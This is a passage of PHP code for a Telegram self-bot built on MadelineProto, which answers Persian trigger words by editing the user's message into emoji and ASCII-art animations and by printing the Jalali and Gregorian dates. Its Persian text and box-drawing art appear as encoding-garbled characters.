  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð¤£']);
  yield $MadelineProto->sleep(1);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð']);
  yield $MadelineProto->sleep(1);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð']);
  yield $MadelineProto->sleep(1);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð']);
  yield $MadelineProto->sleep(1);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð']);
  yield $MadelineProto->sleep(1);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð']);
  yield $MadelineProto->sleep(1);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð']);
  yield $MadelineProto->sleep(1);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð']);
  yield $MadelineProto->sleep(1);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð']);
  yield $MadelineProto->sleep(1);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð']);
  yield $MadelineProto->sleep(1);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð']);
  yield $MadelineProto->sleep(1);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð']);
  yield $MadelineProto->sleep(1);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð¤ª']);
  yield $MadelineProto->sleep(1);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ðº']);
  yield $MadelineProto->sleep(1);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð¹']);
  yield $MadelineProto->sleep(1);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð¸']);
  yield $MadelineProto->sleep(1);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð']);
  yield $MadelineProto->sleep(1);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð']);
  yield $MadelineProto->sleep(1);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ð¥³']);
}
if($text == "ÙÙÛÚ©ÙÙ¾ØªØ±"){
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id ,'message' => "
ââ¬â¬â¬.â.â¬â¬â¬â
ââââââââ 
â¢â¤ ââââââââââââ¢â¤ 
ââ â ââ âââââââââââ¬ 
â¥ââââââ¤ 
âââ©âââ©â 
â¬ââ¬ 
â¬ââ¬  
â¬ââ¬                                  
â¬ââ¬                    
â¬ââ¬     
â¬ââ¬â»/  
â¬ââ¬/â  
â¬ââ¬/  \
" ]);
  yield $MadelineProto->sleep(1);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id , 'message' => '
ââ¬â¬â¬.â.â¬â¬â¬â
ââââââââ 
â¢â¤ ââââââââââââ¢â¤ 
ââ â ââ âââââââââââ¬ 
â¥ââââââ¤ 
âââ©âââ©â 
â¬ââ¬ 
â¬ââ¬  
â¬ââ¬                                  
â¬ââ¬                    
â¬ââ¬â»/  
â¬ââ¬/â  
â¬ââ¬/  \
â¬ââ¬
']);
  yield $MadelineProto->sleep(1);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id , 'message' => '
ââ¬â¬â¬.â.â¬â¬â¬â
ââââââââ 
â¢â¤ ââââââââââââ¢â¤ 
ââ â ââ âââââââââââ¬ 
â¥ââââââ¤ 
âââ©âââ©â 
â¬ââ¬ 
â¬ââ¬  
â¬ââ¬                                  
â¬ââ¬â»/  
â¬ââ¬/â  
â¬ââ¬/  \
â¬ââ¬
â¬ââ¬
']);
  yield $MadelineProto->sleep(1);                      
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id , 'message' => '
ââ¬â¬â¬.â.â¬â¬â¬â
ââââââââ 
â¢â¤ ââââââââââââ¢â¤ 
ââ â ââ âââââââââââ¬ 
â¥ââââââ¤ 
âââ©âââ©â 
â¬ââ¬ 
â¬ââ¬  
â¬ââ¬â»/  
â¬ââ¬/â  
â¬ââ¬/  \
â¬ââ¬
â¬ââ¬
â¬ââ¬
']);
  yield $MadelineProto->sleep(1);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id , 'message' => '
ââ¬â¬â¬.â.â¬â¬â¬â
ââââââââ 
â¢â¤ ââââââââââââ¢â¤ 
ââ â ââ âââââââââââ¬ 
â¥ââââââ¤ 
âââ©âââ©â 
â¬ââ¬ 
â¬ââ¬â»/  
â¬ââ¬/â  
â¬ââ¬/  \
â¬ââ¬
â¬ââ¬ 
â¬ââ¬
â¬ââ¬
']);
  yield $MadelineProto->sleep(1);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id , 'message' => '
ââ¬â¬â¬.â.â¬â¬â¬â
ââââââââ 
â¢â¤ ââââââââââââ¢â¤ 
ââ â ââ âââââââââââ¬ 
â¥ââââââ¤ 
âââ©âââ©â 
â¬ââ¬â»/  
â¬ââ¬/â  
â¬ââ¬/  \
â¬ââ¬
â¬ââ¬ 
â¬ââ¬
â¬ââ¬ 
â¬ââ¬
']);
  yield $MadelineProto->sleep(1);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id , 'message' => '
ââ¬â¬â¬.â.â¬â¬â¬â
ââââââââ 
â¢â¤ ââââââââââââ¢â¤ 
ââ â ââ âââââââââââ¬ 
â¥ââââââ¤ 
âââ©âââ©â 
â¬ââ¬ 
â¬ââ¬
â¬ââ¬
â¬ââ¬
â¬ââ¬ 
â¬ââ¬
â¬ââ¬ 
â¬ââ¬
']);
  yield $MadelineProto->sleep(1);                   
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id , 'message' => '
ââ¬â¬â¬.â.â¬â¬â¬â
ââââââââ 
â¢â¤ ââââââââââââ¢â¤ 
ââ â ââ âââââââââââ¬ 
â¥ââââââ¤ 
âââ©âââ©â
']);
}
if($text== 'ÙÚ©' or $text== 'ÙÚ©Ø±'){
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => '
  ââââââââââââââ¬â¬â¬â¬â¬â¬â¬â¬ââââââ¬â¬â¬â¬â¬â¬â¬ââ¬â¬ââ 
  âââââââ¬â¬âââââââ¬â¬â¬â¬â¬â¬âââââ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â
  ââââââ¬â¬â¬â¬â¬â¬ââââ¬â¬â¬â¬â¬â¬âââ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬ââ 
  ââââââ¬â¬â¬â¬â¬â¬â¬ââââ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬ââ
  ââââââââââââââââââ¬â¬â¬â¬â¬â¬ââââââââââ¬â¬â¬â¬ââ 
  ââââââââââââââââââ¬â¬â¬â¬â¬âââââââââ¬â¬â¬â¬â¬â¬â¬â
  âââââââââ¬â¬ââââââââ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬ââ 
  ââââââ¬â¬â¬â¬âââââââââ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬ââ
  ââââââââââââââââââ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬ââ 
  ââââââââââââââââââ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬ââ ']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => '
  ââââââââââââââââââ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬ââ 
  ââââââââââââââââââ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬ââ
  âââââââââââââââââ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬ââ 
  ââââââââââââââââââââââ¬â¬â¬â¬â¬â¬â¬âââ¬â¬â¬â¬â¬âââ 
  ââââââââââââââââââ¬âââââ¬â¬â¬âââââ¬â¬â¬â¬â¬â¬âââ
  âââââââââââââââââ¬â¬â¬âââ¬ââââââ¬â¬â¬â¬â¬â¬â¬ââââ
  ââââââââââââââââââââââââ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬ââââ
  âââââââââââââââ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬âââââ 
  âââââââââââââââââ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬ââââââ
  âââââââââââââââââââââ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬âââââââ 
  ââââââââââââââââ¬ââââ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬ââââââââ
  âââââââââââââââââââââ¬â¬â¬â¬â¬â¬â¬â¬â¬âââââââââ 
  âââââââââââââââââââââ¬â¬â¬â¬â¬â¬â¬â¬ââââââââââ 
  âââââââââââââââââââââ¬â¬â¬â¬â¬â¬ââââââââââââ']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => '
  ââââââââââââââ¬â¬â¬â¬â¬â¬â¬â¬ââââââ¬â¬â¬â¬â¬â¬â¬ââ¬â¬ââ 
  âââââââ¬â¬âââââââ¬â¬â¬â¬â¬â¬âââââ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â 
  ââââââ¬â¬â¬â¬â¬â¬ââââ¬â¬â¬â¬â¬â¬âââ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬ââ 
  ââââââ¬â¬â¬â¬â¬â¬â¬ââââ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬ââ 
  ââââââââââââââââââ¬â¬â¬â¬â¬â¬ââââââââââ¬â¬â¬â¬ââ 
  ââââââââââââââââââ¬â¬â¬â¬â¬âââââââââ¬â¬â¬â¬â¬â¬â¬â 
  âââââââââ¬â¬ââââââââ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬ââ 
  ââââââ¬â¬â¬â¬âââââââââ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬ââ 
  ââââââââââââââââââ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬ââ 
  ââââââââââââââââââ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬ââ 
  ââââââââââââââââââ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬ââ 
  ââââââââââââââââââ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬ââ 
  âââââââââââââââââ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬ââ 
  ââââââââââââââââââ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬âââ¬ââ¬â¬âââ 
  ââââââââââââââââââââââ¬â¬â¬â¬â¬â¬â¬âââ¬â¬â¬â¬â¬âââ 
  ââââââââââââââââââ¬âââââ¬â¬â¬âââââ¬â¬â¬â¬â¬â¬âââ 
  âââââââââââââââââ¬â¬â¬âââ¬ââââââ¬â¬â¬â¬â¬â¬â¬ââââ 
  ââââââââââââââââââââââââ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬ââââ 
  âââââââââââââââ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬âââââ 
  âââââââââââââââââ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬ââââââ 
  âââââââââââââââââââââ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬âââââââ 
  ââââââââââââââââ¬ââââ¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬ââââââââ 
  âââââââââââââââââââââ¬â¬â¬â¬â¬â¬â¬â¬â¬âââââââââ 
  âââââââââââââââââââââ¬â¬â¬â¬â¬â¬â¬â¬ââââââââââ 
  âââââââââââââââââââââ¬â¬â¬â¬â¬â¬ââââââââââââ']);
      
  }
  if($text== 'Ø¯ÙØ³ØªØª Ø¯Ø§Ø±Ù' or $text== 'ÙÙØ¨ÙÛ'){
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => '
  âââââââââââââââââââââââ
  ââââââââââââââââââââââ']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => '
  ââââââââââââââââââââââ
  âââââââââââââââââââââââ']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => '
  âââââââââââââââââââââââ
  ââââââââââââââââââââââ
  ââââââââââââââââââââââ
  âââââââââââââââââââââââ']);
      
  }
  if($text=='Ø¯ÙÙØª Ø³Ø±ÙÛØ³' or $text=='Ø®ÙØ¯ÙÙÙ' or $text== 'Ø­Ù Ø¨ÙØ¯' or $text == 'Ø®Ø®Ø®'){
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => '
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => '
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => '
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ']);
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => '
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ
  âââââââââââââââââââââââââââââââ']);
  }
if ($text == 'Ù¾ÛØ§ÙÙ') {
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' =>'
âââââââââââââââââââââ
âââââââââââââââââââââ
âââââââââââââââââââââ
âââ©ââ©ââ©ââ©ââ©ââ©ââ©ââ©ââ©ââ
']);
}
if ($text == 'Ø¯ÙØ³ØªØª Ø¯Ø§Ø±Ù Ø¨ÙÙÙØ§') {
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' =>'
ââââââââââââââââââââ
ââââââââââââââââââââ
ââââââââââââââââââââ
ââââââââââââââââââââ
ââââââââââââââââââââ
']);
}
if ($text == 'ÙØ¨Ø®ÙØ¯ Ø¨Ø²Ù') {
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' =>'
ââââââââââ¦ââââââââââ
ââââ¬âââââ¬â£â âââââââââ
â âââââââââââ©â£âââââââ
ââââ©âââââ©â©â©âââââââââ
']);
}
if ($text == 'Ø¨Ú©Ø´Ø´Ø´') {
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' =>'
 /ï¹\
(Ò`_Â´)
<,ï¸»â¦â¤â Ò - -----ð¥
/ï¹\âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ

â /ï¹\
(Ò`_Â´)
<,ï¸»â¦â¤â Ò - -----ð¥
/ï¹\âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
']);
}
if ($text == 'Ø­ÙÙÙÙÙ') {
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' =>'
 /ï¹\
(Ò`_Â´)
<,ï¸»â¦â¤â Ò -
/ï¹\âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ

â /ï¹\
(Ò`_Â´)
<,ï¸»â¦â¤â Ò -
/ï¹\âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
']);
yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' =>'
/ï¹\
(Ò`_Â´)
<,ï¸»â¦â¤â Ò - --
/ï¹\âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ

â /ï¹\
(Ò`_Â´)
<,ï¸»â¦â¤â Ò - --
/ï¹\âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
']);
yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' =>'
/ï¹\
(Ò`_Â´)
<,ï¸»â¦â¤â Ò - ----
/ï¹\âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ

â /ï¹\
(Ò`_Â´)
<,ï¸»â¦â¤â Ò - ----
/ï¹\âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
']);
yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' =>'
/ï¹\
(Ò`_Â´)
<,ï¸»â¦â¤â Ò - -----ð¥
/ï¹\âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ

â /ï¹\
(Ò`_Â´)
<,ï¸»â¦â¤â Ò - -----ð¥
/ï¹\âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
']);
}
if ($text == 'Ú¯Ù Ø¨Ø±Ø§Û Ø®Ù') {
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' =>'
ââ­â­â®â®âââââ±âââ²âââ
â­â­â­â®â®â®ââââââââââ
â°â°â°â¯â¯â¯âââ­â°â«â°â¯â®ââ
ââ°â°ââ¯ââââ°âââââ¯ââ
âââ­â»â³âââââ²â°â¯â±ââ®â
âââ°â³â»ââââ«âââââ­ââ
ââââ¯ââââââââââ£â¯ââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
']);
}
if ($text == 'ÙÙÙÙ') {
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' =>'
 . Â¨ Â¨ Â¨ Â¨ Â¨(
Â¨ Â¨ Â¨ ) Â¨ ) Â¨ (
Â¨ Â¨ Â¨ ) Â¨ ( (Â¨ )
Â¨ Â¨ Â¨( Â¨ ~.) ) (
Â¨[=============]
Â¨ \ Â°Â°Â°Â°Â°Â°Â°Â°Â°Â°Â°Â°Â°Â°   /_ _
 Â¨ |   â¦Â¨â¦Â¨â¦Â¨â¦Â¨â¦ |ËË\*\
 Â¨ |*Â¨ . CAFFEE ..Â¨*| â¦*|*|
 Â¨ | â¦Â¨â¦Â¨â¦Â¨â¦Â¨â¦  |â¦ /*/
  Â¨Â¨\Â°Â°Â°Â°Â°Â°Â°Â°Â°Â°Â°Â°Â°/ ËËËË
   Â¨Â¨ \|||||||||||||||/
']);
}
if ($text == 'ÙØ§ÛÚ© Ø¯Ø§Ø±Û') {
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' =>'
âââââââââ²âââââ
âââââââââââLIKE
ââââââââââââââ
âââââââ±âââââââ
ââââââââââââââ
ââââââââââââââ
âââââââ²ââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
']);
}
if ($text == 'Ø¯Ø§ÙØ´ Ø¢ÙÙØ²Ø§Ù') {
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' =>'
â­â°â°â®â£â»â»â«â­â³â³â®ââââ 
âââââââââ¯âââ°ââââ 
â«â°â¯â£â«â°â¯â£â«â°â¯â£â«â°â¯â£ 
ââ³â³ââ°â³â³â¯â°â³â³â¯ââ³â³â 
ââââââââââââââââ 
']);
}
if ($text == 'Ø³Ø§Ø¹Øª ÙÚÛ') {
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' =>'
â¦â¦â¦â¦â¦â¦âââââââââ¦â¦â¦â¦â¦â¦
ââââââââââââââââââââ
ââââââââââââââââââââ
ââââââââââââââââââââ
â©â©â©â©â©â©âââââââââ©â©â©â©â©â©
']);
}
if ($text == 'Ø®ÙØ´ Ø¢ÙØ¯') {
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' =>'
ââââââââââââââââââââ
â â¦ââ¦âââ¦âââââââ¦âââ       â
â ââââ âââââââââââ â       â
â ââ©ââââââââââ©ââ©ââ       â
ââââââââââââââââââââ
']);
}
if ($text == 'Ø¯ÙØ±Ø¨ÛÙ') {
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' =>'
ââââââââââ
âââââââââââââââ
âââââââââââââââ
âââââââââââââââ
âââââââââââââââ
']);
}
if ($text == 'ØªÙÙÙ') {
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' =>'
ââââââââââââ
ââââââââââââââ
ââââââââââââââ
âââââââââââââ
âââââââââââââ

']);
}
if ($text == 'ØªÙÙØ¯ ÙØ¨Ø§Ø±Ú©') {
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' =>'
 ââââââââ à³á¦á¦à³ ââââââââ
 à³ Happy Birthday To You à³
 ââââââââ à³á¦á¦à³ ââââââââ
']);
}
if ($text == 'Ø¨Ù¾Ø± Ù¾Ø§ÛÛÙ') {
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' =>'
ââââââââ
ââ¬ï¸â¬ï¸â¬ï¸â¬ï¸â¬ï¸â
ââ¬ï¸â¬ï¸â¬ï¸â¬ï¸â¬ï¸â ï¼¼ï¼¼
ââ¬ï¸â¬ï¸â¬ï¸â¬ï¸â¬ï¸â
ââ¬ï¸â¬ï¸â¬ï¸â¬ï¸â¬ï¸âã½âã
ââ¬ï¸â¬ï¸â¬ï¸â¬ï¸â¬ï¸â   /
ââ¬ï¸â¬ï¸â¬ï¸â¬ï¸â¬ï¸âã)
ââ¬ï¸â¬ï¸â¬ï¸â¬ï¸â¬ï¸â
ââ¬ï¸â¬ï¸â¬ï¸â¬ï¸â¬ï¸â
ââ¬ï¸â¬ï¸â¬ï¸â¬ï¸â¬ï¸â
ââ¬ï¸â¬ï¸â¬ï¸â¬ï¸â¬ï¸â
ââ¬ï¸â¬ï¸â¬ï¸â¬ï¸â¬ï¸â
']);
}
if ($text == 'Ø¶Ø¨Ø·') {
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' =>'
ââââââââââââââââââ
ââââââââââââââââââââ
ââââââââââââââââââââ
ââââââââââââââââââââ
ââââââââââââââââââââ
']);
}
if ($text == 'ÙÛÙØ§Ù') {
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' =>'
âââââââ
ââââââââ
âââââââââ
âââââââââ
âââââââ
']);
}
if ($text == 'Ø²777') {
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' =>'
ââââââââââââââââââââ
ââââââââââââââââââââ
âââââââââââââââââââ
âââââââââââââââââââ
ââââââââââââââââââ
']);
}
if ($text == 'Ø¨Ø§ÙÚ¯Ø±Ø¯') {
  yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' =>'
ââ¬â¬â¬.â.â¬â¬â¬
ââââââââ
â¢â¤ ââââââââââââ¢â¤
ââ â ââ âââââââââââ¬
â¥ââââââ¤
âââ©âââ©â
â¬ââ¬
â¬ââ¬ 
â¬ââ¬                                 
â¬ââ¬                   
â¬ââ¬    
â¬ââ¬â»/ 
â¬ââ¬/â 
â¬ââ¬/  \
']);
}
if ($text == 'ÙÛÙ' or $text == 'ÙÙØ¨Û' or $text == 'Ø¹Ø´ÙÛ') {
	yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
âââââââââââ 
âââââââââââ 
âââââââââââ 
ââââââââ 
"]);
yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
âââââââââââ 
âââââââââââ 
âââââââââââ 
ââââââââ 
âââââââ 
âââââ 
"]);
yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
âââââââââââ 
âââââââââââ 
âââââââââââ 
ââââââââ 
âââââââ 
âââââ 
ââââ 
ââââââââââââââ 
âââââââââââââââââ 
âââââââââââââââââââ 
âââââââââ(â)ââââââ 
ââââââââââââââââââââ 
âââââââââââââââââââââ 
"]);
yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
âââââââââââ 
âââââââââââ 
âââââââââââ 
ââââââââ 
âââââââ 
âââââ 
ââââ 
ââââââââââââââ 
âââââââââââââââââ 
âââââââââââââââââââ 
âââââââââ(â)ââââââ 
ââââââââââââââââââââ 
âââââââââââââââââââââ 
ââââââââââââââââââââââ 
ââââââââââââââââââââââ 
ââââââââââââââââââââââ 
ââââââââââââââââââââââ 
"]);
yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
âââââââââââ 
âââââââââââ 
âââââââââââ 
ââââââââ 
âââââââ 
âââââ 
ââââ 
ââââââââââââââ 
âââââââââââââââââ 
âââââââââââââââââââ 
âââââââââ(â)ââââââ 
ââââââââââââââââââââ 
âââââââââââââââââââââ 
ââââââââââââââââââââââ 
ââââââââââââââââââââââ 
ââââââââââââââââââââââ 
ââââââââââââââââââââââ 
âââââââââââââââââââââ 
âââââââââââââââââââââ
"]);
  }
  if ($text == 'ØªØ§Ø±ÛØ® Ø´ÙØ³Û') {
include 'jdf.php';
$fasl = jdate('f');
$month_name= jdate('F');
$day_name= jdate('l');
$tarikh = jdate('y/n/j');
$hour = jdate('H:i:s - a');
$animal = jdate('q');
yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "Ø§ÙØ±ÙØ²  $day_name  |$tarikh|

ÙØ§Ù ð: $month_name

ÙØµÙ âï¸: $fasl

Ø³Ø§Ø¹Øª âï¸: $hour

Ø­ÛÙØ§Ù Ø§ÙØ³Ø§Ù ð: $animal
"]);
}

if ($text == 'ØªØ§Ø±ÛØ® ÙÛÙØ§Ø¯Û') {
date_default_timezone_set('UTC');
$rooz = date("l"); // Ø±ÙØ²
$tarikh = date("Y/m/d"); // Ø³Ø§Ù
$mah = date("F"); // ÙØ§Ù ÙØ§Ù
$hour = date('H:i:s - A'); // Ø³Ø§Ø¹Øª
yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "Today is  $rooz $tarikh

month ð: $mah

time âï¸: $hour"]);
}
//===================================================================================================================//
